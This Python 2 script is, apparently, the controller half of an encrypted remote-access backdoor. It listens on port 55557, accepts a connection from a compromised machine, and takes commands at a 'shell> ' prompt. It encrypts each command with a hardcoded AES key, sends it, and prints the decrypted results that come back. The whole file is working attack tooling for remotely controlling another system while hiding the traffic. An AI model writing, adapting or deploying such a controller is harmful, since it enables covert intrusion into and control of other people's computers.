#!/usr/bin/python

import os,sys,socket
import base64
from Crypto.Cipher import AES

BUFFER = 4096
BLOCK = 32
PADDING = '!'
SECRET = "vu6TZprmfje5A~F5]T_$Ls-?#!:@5sXH"
HOST = '0.0.0.0'
PORT = 55557

# Add padding, encode and decode functions
addPadding = lambda s: s + (BLOCK - len(s) % BLOCK) * PADDING
encodeAES = lambda c, s: base64.b64encode(c.encrypt(addPadding(s)))
decodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

def openTheDoor():
	
	cipher = AES.new(SECRET)
	
	server = socket.socket()
	server.bind((HOST, PORT))
	
	server.listen(5)
	client, addr = server.accept()
	print 'Got connection from ', addr
	
	
	while True:
		cmd = raw_input("shell> ")
	
		cmd = encodeAES(cipher, cmd)
		cmd = base64.b64encode(cmd)
	
		client.send(cmd)
	
		result = client.recv(BUFFER)
	
		result = base64.b64decode(result)
		result = decodeAES(cipher, result) 
	
		print(result)
	
	client.close()


if __name__ == "__main__":
	
	openTheDoor()
